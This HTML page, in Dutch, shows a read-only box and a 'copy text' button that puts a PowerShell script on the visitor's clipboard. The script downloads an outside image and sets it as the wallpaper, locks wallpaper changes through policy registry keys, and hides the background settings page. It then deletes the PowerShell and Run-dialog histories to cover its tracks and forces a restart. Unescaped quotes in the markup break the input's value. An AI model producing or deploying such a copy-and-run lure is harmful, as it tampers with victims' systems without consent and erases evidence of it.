<!doctype html>
<html lang="nl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kopieer tekst</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f0f0f0; /* lichtgrijs */
      font-family: 'Segoe UI', Arial, sans-serif;
    }

    .card {
      background: #ffffff;
      padding: 40px 50px;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
      text-align: center;
      max-width: 400px;
      width: 100%;
    }

    input {
      width: 100%;
      padding: 18px;
      font-size: 22px;
      border-radius: 10px;
      border: 1px solid #ccc;
      background: #e0e0e0;
      color: #333;
      outline: none;
      text-align: center;
    }

    input[readonly] {
      cursor: default;
    }

    button {
      margin-top: 20px;
      width: 100%;
      padding: 16px;
      font-size: 18px;
      border: none;
      border-radius: 10px;
      background: #b0b0b0;
      color: white;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }

    button:hover {
      background: #999;
    }

    button:active {
      transform: translateY(2px);
    }

    .msg {
      margin-top: 14px;
      font-size: 14px;
      color: #666;
      min-height: 18px;
    }
  </style>
</head>
<body>

  <div class="card">
    <input type="text" value="$imageUrl = "https://wallpaperaccess.com/full/1484523.jpg"
$imagePath = "$env:USERPROFILE\Downloads\background.jpg"

Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public const int SPI_SETDESKWALLPAPER = 20;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDWININICHANGE = 0x02;

    public static void SetWallpaper(string path) {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
    }
}
"@

[Wallpaper]::SetWallpaper($imagePath)

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

Set-ItemProperty -Path $regPath -Name "NoChangingWallpaper" -Value 1

$regPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
if (-not (Test-Path $regPath2)) {
    New-Item -Path $regPath2 -Force | Out-Null
}

Set-ItemProperty -Path $regPath2 -Name "NoDispBackgroundPage" -Value 1

Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

$runMruRegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path $runMruRegPath) {
    Remove-Item -Path $runMruRegPath -Recurse -Force
    New-Item -Path $runMruRegPath | Out-Null
}

Restart-Computer -Force" id="myInput" readonly>
    <button id="copyBtn">Kopieer tekst</button>
    <div class="msg" id="msg"></div>
  </div>

  <!-- Modern, makkelijk vervangbaar script -->
  <script type="module">
    // Functie apart, makkelijk herbruikbaar
    function copyToClipboard(text) {
      return navigator.clipboard.writeText(text);
    }

    const input = document.getElementById('myInput');
    const button = document.getElementById('copyBtn');
    const msg = document.getElementById('msg');

    button.addEventListener('click', async () => {
      try {
        await copyToClipboard(input.value);
        msg.textContent = "Gekopieerd!";
        setTimeout(() => msg.textContent = "", 1500);
      } catch (err) {
        console.error("Fout bij kopiÃ«ren:", err);
        msg.textContent = "Kopieer mislukt!";
      }
    });
  </script>

</body>
</html>
